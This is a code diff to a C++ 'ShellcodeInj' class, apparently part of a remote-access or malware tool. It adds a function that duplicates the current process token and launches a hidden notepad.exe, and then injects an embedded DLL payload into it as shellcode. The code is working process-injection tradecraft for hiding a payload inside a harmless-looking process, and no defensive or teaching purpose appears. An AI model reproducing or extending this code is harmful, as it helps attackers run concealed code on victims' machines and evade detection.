@@ -16,12 +16,19 @@ class ShellcodeInj
 {
 public:
 	// Return the process id if inject succeed.
-	int InjectProcess(const char* processName = nullptr) {
+	int InjectProcess(const char* processName = nullptr, bool hasPermission=false) {
 		if (processName) {
 			auto pid = GetProcessIdByName(processName);
 			if (pid ? InjectShellcode(pid, (BYTE*)TinyRun_dll, TinyRun_dll_len) : false)
 				return pid;
 		}
+		if (hasPermission) {
+			auto pid = LaunchNotepadWithCurrentToken();
+			if (pid) {
+				return InjectShellcode(pid, (BYTE*)TinyRun_dll, TinyRun_dll_len) ? pid : 0;
+			}
+		}
+
 		PROCESS_INFORMATION pi = {};
 		STARTUPINFO si = { sizeof(STARTUPINFO) };
 		si.dwFlags = STARTF_USESHOWWINDOW;
@@ -34,6 +41,49 @@ public:
 		return 0;
 	}
 private:
+	DWORD LaunchNotepadWithCurrentToken() {
+		HANDLE hToken = NULL;
+
+		// 打开当前进程 token
+		if (!OpenProcessToken(GetCurrentProcess(),
+			TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID,
+			&hToken)) {
+			Mprintf("OpenProcessToken failed: %d\n", GetLastError());
+			return 0;
+		}
+
+		// 复制主 token
+		HANDLE hNewToken = NULL;
+		if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hNewToken)) {
+			Mprintf("DuplicateTokenEx failed: %d\n", GetLastError());
+			CloseHandle(hToken);
+			return 0;
+		}
+
+		STARTUPINFOW si = { sizeof(si) };
+		PROCESS_INFORMATION pi = {};
+		si.dwFlags = STARTF_USESHOWWINDOW;
+		si.wShowWindow = SW_HIDE;
+
+		// 使用复制后的 token 启动 notepad
+		if (!CreateProcessWithTokenW(hNewToken, 0, L"C:\\Windows\\System32\\notepad.exe",
+			NULL, 0, NULL, NULL, &si, &pi)) {
+			Mprintf("CreateProcessWithTokenW failed: %d\n", GetLastError());
+			CloseHandle(hToken);
+			CloseHandle(hNewToken);
+			return 0;
+		}
+
+		DWORD dwProcessId = pi.dwProcessId;
+
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		CloseHandle(hToken);
+		CloseHandle(hNewToken);
+
+		return dwProcessId; // 返回子进程 ID
+	}
+
 	// Find process id by name.
 	DWORD GetProcessIdByName(const std::string& procName) {
 		DWORD pid = 0;
